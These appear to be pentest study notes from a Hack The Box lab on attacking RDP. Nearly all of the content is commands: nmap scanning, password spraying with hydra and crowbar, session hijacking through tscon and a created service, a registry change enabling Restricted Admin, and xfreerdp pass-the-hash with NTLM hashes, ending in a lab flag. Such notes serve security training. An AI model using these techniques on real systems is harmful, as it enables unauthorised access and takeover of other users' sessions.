# Attacking RDP

## Enumeration

nmap -Pn -p3389 $TARGET

## Misconfigurations

cat usernames.txt 
crowbar -b rdp -s $TARGET -U users.txt -c 'password123'
hydra -L usernames.txt -p 'password123' $TARGET rdp

## RDP Login

rdesktop -u admin -p password123 $TARGET

## RDP Session Hijacking

On Powershell :
whoami
query user

tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}

If Administrator rights create a service run as Local System :
query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack

## RDP Pass-the-Hash (PtH)

Adding the DisableRestrictedAdmin Registry Key :
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

## LAB

xfreerdp /u:htb-rdp /p:"HTBRocks!" /v:$TARGET

pentest-notes.txt
User: Administrator
Hash: 0E14B9D6330BF16C30B1924111104824

C:\Users\htb-rdp>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.

xfreerdp /v:$TARGET /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824

HTB{RDP_P4$$_Th3_H4$#}